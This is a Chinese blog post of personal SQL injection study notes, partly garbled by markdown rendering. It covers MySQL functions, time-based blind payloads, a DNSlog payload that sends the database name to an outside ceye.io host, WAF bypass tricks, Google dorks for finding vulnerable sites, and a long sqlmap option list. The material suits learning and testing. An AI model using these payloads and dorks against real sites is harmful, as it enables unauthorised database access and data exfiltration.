<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sql注入总结 | LuoYuのBLOG</title><meta name="description" content="[toc] mysqlmysql常用函数：12345678910111213141516171819202122232425262728293031system_user()返回系统用户名user()数据库用户名current_user()当前用户database()数据库@@datadir数据库路径@@basedir数据库安装路径@@version_compile_os操作系统信息concat_"><meta name="keywords" content="sql注入"><meta name="author" content="LuoYu"><meta name="copyright" content="LuoYu"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="sql注入总结"><meta name="twitter:description" content="[toc] mysqlmysql常用函数：12345678910111213141516171819202122232425262728293031system_user()返回系统用户名user()数据库用户名current_user()当前用户database()数据库@@datadir数据库路径@@basedir数据库安装路径@@version_compile_os操作系统信息concat_"><meta name="twitter:image" content="http://retnull.top/img/test3.jpg"><meta property="og:type" content="article"><meta property="og:title" content="sql注入总结"><meta property="og:url" content="http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><meta property="og:site_name" content="LuoYuのBLOG"><meta property="og:description" content="[toc] mysqlmysql常用函数：12345678910111213141516171819202122232425262728293031system_user()返回系统用户名user()数据库用户名current_user()当前用户database()数据库@@datadir数据库路径@@basedir数据库安装路径@@version_compile_os操作系统信息concat_"><meta property="og:image" content="http://retnull.top/img/test3.jpg"><meta property="article:published_time" content="2020-04-24T04:54:13.000Z"><meta property="article:modified_time" content="2020-05-04T13:41:05.956Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><link rel="prev" title="bugku_writeup_cookie欺骗" href="http://retnull.top/2020/04/24/bugku-writeup-cookie%E6%AC%BA%E9%AA%97/"><link rel="next" title="bugku_速度要快" href="http://retnull.top/2020/04/23/bugku-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/dog.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">16</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">27</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql"><span class="toc-number">1.</span> <span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql常用函数："><span class="toc-number">1.1.</span> <span class="toc-text">mysql常用函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入流程"><span class="toc-number">1.2.</span> <span class="toc-text">sql注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql注入点："><span class="toc-number">1.2.1.</span> <span class="toc-text">sql注入点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错盲注"><span class="toc-number">1.3.</span> <span class="toc-text">报错盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">1.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dnslog盲注"><span class="toc-number">1.5.</span> <span class="toc-text">Dnslog盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap进阶"><span class="toc-number">2.</span> <span class="toc-text">sqlmap进阶</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/test3.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">LuoYuのBLOG</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">sql注入总结</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-04-24 12:54:13"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-04-24</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-05-04 21:41:05"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-05-04</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><p>[toc]</p>
<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="mysql常用函数："><a href="#mysql常用函数：" class="headerlink" title="mysql常用函数："></a>mysql常用函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">system_user()</span><br><span class="line">返回系统用户名</span><br><span class="line">user()</span><br><span class="line">数据库用户名</span><br><span class="line">current_user()</span><br><span class="line">当前用户</span><br><span class="line">database()</span><br><span class="line">数据库</span><br><span class="line">@@datadir</span><br><span class="line">数据库路径</span><br><span class="line">@@basedir</span><br><span class="line">数据库安装路径</span><br><span class="line">@@version_compile_os</span><br><span class="line">操作系统信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">concat_ws(分隔符,..)</span><br><span class="line">用自定义分隔符分割数据</span><br><span class="line">group_concat()</span><br><span class="line">用逗号分割数据 一行显示</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">slelect load_file(路径)</span><br><span class="line">读文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select ... into outfile(路径）</span><br><span class="line">写文件</span><br><span class="line">mid(字符串，起始位置，长度） 从1开始 &#x3D;&#x3D;substr()</span><br><span class="line">返回字符串的一部分</span><br></pre></td></tr></table></figure>

<h3 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h3><h4 id="sql注入点："><a href="#sql注入点：" class="headerlink" title="sql注入点："></a>sql注入点：</h4><blockquote>
<p>无特定目标：<code>inurl:.php?id=</code></p>
<p>有特定目标：<code>nurl:.php?id=  site:target.com</code></p>
</blockquote>
<p>==用sqlmap检测==、</p>
<blockquote>
<p>sqlmap-m filename(每行保存一个url）</p>
<p>sqlmap –crawl (对目标网站进行爬取，然后依次测试）</p>
</blockquote>
<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><hr>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>==基本语法==</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),1,1))&gt;115,0,sleep(3))%23</span><br><span class="line">if(left(user(),1)&#x3D;&#39;a&#39;,0,sleep(3))</span><br></pre></td></tr></table></figure>

<h3 id="Dnslog盲注"><a href="#Dnslog盲注" class="headerlink" title="Dnslog盲注"></a>Dnslog盲注</h3><p>==原理==</p>
<blockquote>
<p>布尔盲注或者时间盲注等会发送多次请求，触发设备的保护。用dnslog可以减少请求次数</p>
</blockquote>
  <figure class="highlight plain"><figcaption><span>load_file(concat('\\\\',(select database()),'.mysql.r40urp.ceye.io\\abd'))```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">***load_file***只能在Windows平台</span><br><span class="line"></span><br><span class="line">0 </span><br><span class="line"></span><br><span class="line">## sql注入绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 宽字节注入</span><br><span class="line"></span><br><span class="line">&gt; 大小是一个字节的是窄字节，大小是两个字节的是宽字节。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 常用的宽字节：GB2312 GBK GB18030 BIG5 Shift_JIS等都是宽字节 都是两个字节</span><br><span class="line"></span><br><span class="line">![image-20200429131407481](sql注入总结&#x2F;image-20200429131407481.png)</span><br><span class="line"></span><br><span class="line">&gt; 自动加上的&#x2F;和%df组成了汉字，而单引号得以保留</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;sqlmap宽字节注入&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">&gt; 在url后面添加%df‘</span><br><span class="line">&gt;</span><br><span class="line">&gt; 使用unmagicquotes.py脚本绕过</span><br><span class="line">&gt;</span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">***宽字节防御***</span><br><span class="line"></span><br><span class="line">&gt; 1. 直接使用utf-8</span><br><span class="line">&gt; 2. mysql_real_escape_string函数，前提是使用&#96;mysql_set_charset(&#39;gbk&#39;.$con)&#96;</span><br><span class="line">&gt; 3. 设置参数 &#96;character_set_client&#x3D;binary&#96; 二进制形式来连接数据库</span><br><span class="line"></span><br><span class="line">### 二次编码注入</span><br><span class="line"></span><br><span class="line">&gt; 在二次解码转化中夹了一次转义，但是转义未识别到字符，接着在最后一次解码中带入了未被转义字符</span><br><span class="line"></span><br><span class="line">&#96;%2527&#96;---&gt;&#96;%27&#96;--&#96;&#39;&#96;&#39;</span><br><span class="line"></span><br><span class="line">### 二次注入</span><br><span class="line"></span><br><span class="line">&gt; 1. 插入恶意数据</span><br><span class="line">&gt; 2. 引用恶意数据</span><br><span class="line">&gt;</span><br><span class="line">&gt; 防御：</span><br><span class="line">&gt;</span><br><span class="line">&gt; 对提交数据严谨对待，对内部的数据也要严格检查</span><br><span class="line"></span><br><span class="line">## waf绕过</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&gt; ***白盒绕过***</span><br><span class="line">&gt;</span><br><span class="line">&gt; 大小写：Or,OR,OR</span><br><span class="line">&gt;</span><br><span class="line">&gt; 等价替换：and:&amp;&amp; of:||</span><br><span class="line"></span><br><span class="line">### 黑盒绕过</span><br><span class="line"></span><br><span class="line">1. 架构层绕过waf：</span><br><span class="line"></span><br><span class="line">&gt; 1. 寻找源站：针对云waf</span><br><span class="line">&gt; 2. 同网段利用  绕过waf保护区域</span><br><span class="line">&gt; 3. 边界漏洞 ：ssrf等</span><br><span class="line"></span><br><span class="line">2. 资源限制绕过</span><br><span class="line"></span><br><span class="line">&gt; post大于BODY</span><br><span class="line"></span><br><span class="line">3. 协议绕过</span><br><span class="line"></span><br><span class="line">&gt; 尝试post和get等切换</span><br><span class="line">&gt;</span><br><span class="line">&gt; content-type:</span><br><span class="line">&gt;</span><br><span class="line">&gt; 参数污染：中间件和waf的识别差别 </span><br><span class="line"></span><br><span class="line">4. 规则层面的绕过</span><br><span class="line"></span><br><span class="line">&gt; &#96;&#96;&#96;myslq</span><br><span class="line">&gt; union&#x2F;**&#x2F;select</span><br><span class="line">&gt; union&#x2F;*aaaaaaaaaaaa*&#x2F;select</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>内联注释：<code>/*!xxx*/</code>加了！会执行</p>
</blockquote>
<blockquote>
<p>空白符号绕过</p>
<p>mysql空白符：<code>%09.%0A,%0B,%0D,%20,%0C,%A0/*Xxx*/</code></p>
<p>正则的空白符：<code>%09,%0A,%0B,%0D,%20</code></p>
<p>例如<code>union%250C</code></p>
</blockquote>
<h2 id="sqlmap进阶"><a href="#sqlmap进阶" class="headerlink" title="sqlmap进阶"></a>sqlmap进阶</h2><p><code>-- prefix  xxx</code>:闭合查询，例如<code>)))</code>,<code>&quot;&#39;</code>‘</p>
<p><code>-- suffix</code>:注释</p>
<blockquote>
<p>sqlmap连接数据库</p>
<p><code>python .\sqlmap.py -d &quot;mysql://root:011999@127.0.0.1:3306/test&quot; --banner --users</code></p>
<p><code>-l 日志文件</code>:抓包的日志文件进行sql注入</p>
<p><code>-X</code>:从sitemap.xml站点地图文件中读取目标探测</p>
<p><code>-m</code>:对多个url进行探测</p>
<p><code>-r</code>对请求头中的字段探测</p>
<p><code>-c</code>：从配置文件中探测</p>
<p><code>-f</code>:指纹信息</p>
<p><code>-v</code>：6个探测等级，3的时候可以显示payload</p>
<p>Google批量扫描：</p>
<p><code>-g  &quot;inurl:.php?id=&quot;</code></p>
<p>==设置http请求方法==</p>
<p><code>--method=PUT</code></p>
<p>设置为post提交：</p>
<p><code>--data=&quot;id=1&quot;</code></p>
<p>设置参数分隔符</p>
<p><code>--param-del=&#39;&amp;&#39;</code>:用&amp;分割多个数据</p>
<hr>
<p>sqlmap设置请求头：</p>
<hr>
<p><code>--user-agent</code>:设置</p>
<p><code>--random-&#39;agent</code>‘随机设置</p>
<p><code>--referer</code></p>
<p>==对以上的检测需要设置<code>--level</code>=3==</p>
<p><code>--headers=&quot;user-agent:xxxx\ncookie:xxxxx&quot;</code></p>
<hr>
<p>sqlmap设置http协议认证：</p>
<p><code>--auth-type Basic/DIgest/NTLM</code></p>
<p><code>--auth-cred &quot;user:psw&quot;</code></p>
<hr>
<p><strong><em>设置代理</em></strong></p>
<p><code>--proxy</code>http(s)://ip[:port]<br><code>--proxy-cred</code>‘usr:psw’</p>
<p><code>--proxy-file</code> 多条代理</p>
<p><code>--ignore-proxy</code> 忽略系统设置的代理</p>
<hr>
<p>设置tor网络</p>
<p><code>--tor</code>开启</p>
<p><code>--tor-port</code>指定端口</p>
<p><code>--tor-type</code>类型</p>
<p><code>--check-tor</code>检测可用</p>
<hr>
<p>设置延迟</p>
<p><code>--delay 0.5</code>延迟0.5s</p>
<hr>
<p>设置超时&amp;连接次数</p>
<p><code>--timeout 30.0</code>超时30s</p>
<p><code>--retries count</code>默认3次</p>
<hr>
<p>设置随机化参数</p>
<p><code>--randomize id</code>id对于的值变化</p>
<hr>
<p>设置日志过滤目标 </p>
<p><code>-l burp.log --scope=&quot;(www)?.+/com&quot;</code></p>
<hr>
<p>设置忽略401</p>
<p><code>---ignore-401</code>出现401继续探测</p>
<p>绕过认证，直接探测</p>
<hr>
<p>设置http私钥</p>
<p><code>--auth-firl</code>PEM格式文件</p>
<hr>
<p>设置安全模式</p>
<p><strong><em>盲注过程中服务器销毁了会话</em></strong></p>
<p><code>--safe-url</code>指定url</p>
<p><code>--safe-post</code>post参数</p>
<p><code>--safe-req</code>读取http请求文件 -r</p>
<p><code>--safe-freq</code>多条http请求</p>
<hr>
<p>设置忽略url编码</p>
<p>后端服务器不遵循RFC标准</p>
<p><code>--skip-urlencode</code></p>
</blockquote>
<blockquote>
<p>sqlmap性能优化</p>
<hr>
<p>持久http连接：<br><code>---keep-alive</code> connection:keep-alive</p>
<p>加快探测速度</p>
<hr>
<p>设置空连接 检索没有body响应的内容</p>
<p><code>--null-connection</code></p>
<hr>
<p>设置多线程</p>
<p><code>--thread</code>10</p>
<p>默认的线程数是1</p>
<p>最大是10</p>
<hr>
<p>设置预测输出</p>
<p><code>--predic-output</code></p>
<p>与线程不兼容</p>
<hr>
<p>开启所有的性能优化参数</p>
<p><code>-o</code></p>
</blockquote>
<blockquote>
<p><code>-p</code>指定探测的参数</p>
<p><code>-p &#39;id,user-agent&#39;</code></p>
<hr>
<p><code>--skip &#39;id&#39;</code></p>
<p>忽略参数</p>
<hr>
<p>忽略非动态参数</p>
<p><code>--skip-static</code></p>
<hr>
</blockquote>
<p><strong><em>指定注入点</em></strong></p>
<blockquote>
<p><code>?id=1*</code>*指定的是payload注入的位置 </p>
<hr>
</blockquote>
<p>自定义探测参数</p>
<blockquote>
<p>设置探测等级</p>
<p><code>--level</code> 1~5</p>
<p>cookie &gt;=2</p>
<p>header&gt;=3</p>
<hr>
<p>设置风险参数</p>
<p><code>--risk</code> 2：增加了基于查询时间的sql注入</p>
<p>3：基于or</p>
<hr>
<p>设置页面比较参数</p>
<p><code>--string</code>指定包含字符串 查询为true</p>
<p><code>--not-string</code>指定包含字符串</p>
<p><code>--regexp</code>正则表达式</p>
<p><code>--code</code>:转态码</p>
<hr>
<p>设置内容比较参数</p>
<p><code>--text-only</code>:页面中的文本</p>
<p><code>--titles</code>对比标题</p>
</blockquote>
<p>设置具体sql注入技术</p>
<blockquote>
<p><code>--technique</code></p>
<blockquote>
<p>B:布尔注入</p>
<p>E:报错注入</p>
<p>U:联合查询注入</p>
<p>S:堆叠注入</p>
<p>T:基于时间的注入</p>
<p>Q:内联查询注入</p>
</blockquote>
</blockquote>
<p>设置盲注的时间</p>
<blockquote>
<p><code>-time-sec 3</code>延时3秒 默认5秒</p>
</blockquote>
<p>设置union字段数及探测的字符</p>
<blockquote>
<p><code>--union-cols</code>1-20</p>
<hr>
<p>设置指定的字符探测字段</p>
<p><code>--union-char</code>1</p>
<p>默认是NULL</p>
</blockquote>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LuoYu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://retnull.top" target="_blank">LuoYuのBLOG</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/img/test4.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/04/24/bugku-writeup-cookie%E6%AC%BA%E9%AA%97/"><img class="prev_cover lazyload" data-src="/img/test3.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">bugku_writeup_cookie欺骗</div></div></a></div><div class="next-post pull_right"><a href="/2020/04/23/bugku-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/"><img class="next_cover lazyload" data-src="/img/test3.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">bugku_速度要快</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By LuoYu</div><div class="framework-info"><span>驱动 </span><a href="https://retnullyu.github.io/" target="_blank" rel="noopener"><span>LuoYu</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://retnullyu.github.io/" target="_blank" rel="noopener"><span>LuoYuの主题</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script defer id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script id="canvas_nest" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/third-party/click_heart.js"></script><script>var endLoading = function () {
  document.body.style.overflow = 'auto';
  document.getElementById('loading-box').classList.add("loaded")
}
window.addEventListener('load',endLoading)</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>